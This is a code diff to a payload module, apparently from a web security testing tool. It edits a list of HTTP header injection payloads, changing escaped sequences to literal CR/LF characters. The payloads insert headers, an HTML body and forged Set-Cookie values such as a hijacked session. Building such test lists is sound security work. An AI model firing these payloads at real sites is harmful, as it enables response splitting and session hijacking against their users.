@@ -357,14 +357,14 @@ class PayloadsModule:
             List of header injection payload strings.
         """
         return [
-            "value\\r\\nInjected-Header: injected",
-            "value\\r\\n\\r\\n<html>Injected Body</html>",
+            "value\r\nInjected-Header: injected",
+            "value\r\n\r\n<html>Injected Body</html>",
             "value%0d%0aInjected-Header:%20injected",
             "value%0aInjected-Header:%20injected",
             "value%0dInjected-Header:%20injected",
-            "value\\nSet-Cookie: injected=true",
+            "value\nSet-Cookie: injected=true",
             "value%0d%0aSet-Cookie:%20session=hijacked",
-            "value\\r\\nX-Injected: true",
+            "value\r\nX-Injected: true",
         ]
 
     # ------------------------------------------------------------------
